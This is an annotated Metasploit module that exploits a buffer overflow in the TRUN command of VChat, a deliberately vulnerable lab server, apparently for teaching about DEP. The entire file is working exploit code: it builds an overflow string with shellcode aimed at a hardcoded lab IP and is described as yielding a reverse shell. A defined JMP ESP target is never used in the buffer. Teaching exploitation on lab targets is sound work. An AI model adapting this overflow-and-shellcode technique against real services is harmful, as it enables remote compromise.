##
# The # symbol starts a comment
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# File path: /usr/share/metasploit-framework/modules/exploit/windows/VChat/TRUN_BDEP.rb
##
# This module exploits the TRUN command of vulnerable chat server to  showcase DEP protections
##

class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
  Rank = NormalRanking	# Potential impact to the target

  include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module

  def initialize(info = {})	# i.e. constructor, setting the initial values
    super(update_info(info,
      'Name'           => 'VChat/Vulnserver Buffer Overflow-TRUN command',	# Name of the target
      'Description'    => %q{	# Explaining what the module does
         This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell. 
      },
      'Author'         => [ 'fxw' ],	## Hacker name
      'License'        => MSF_LICENSE,
      'References'     =>	# References for the vulnerability or exploit
        [
          #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
          [ 'URL', 'https://github.com/DaintyJet/VChat_ROP_INTRO' ]

        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
        },      
      'Payload'        =>	# How to encode and generate the payload
        {
          'BadChars' => "\x00\x0a\x0d"	# Bad characters to avoid in generated shellcode
        },
      'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
      'Targets'        =>	#  targets for many exploits
      [
        [ 'EssFuncDLL-JMPESP',
          {
            'jmpesp' => 0x62501023 # This will be available in [target['jmpesp']]
          }
        ]
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
      register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
          [
          OptInt.new('RETOFFSET', [true, 'Offset of Return Address in function', 1995]),
          Opt::RPORT(9999),
          Opt::RHOSTS('192.168.7.191'),
      ])
  end

  def exploit	# Actual exploit
    print_status("Connecting to target...")
    connect	# Connect to the target

    shellcode = payload.encoded	# Generated and encoded shellcode
    outbound = 'TRUN /.:/' + "A"*datastore['RETOFFSET'] + shellcode + "\x90" * 990 # Create the malicious string that will be sent to the target

    print_status("Sending Exploit")
    sock.put(outbound)	# Send the attacking payload

    disconnect	# disconnect the connection
  end
end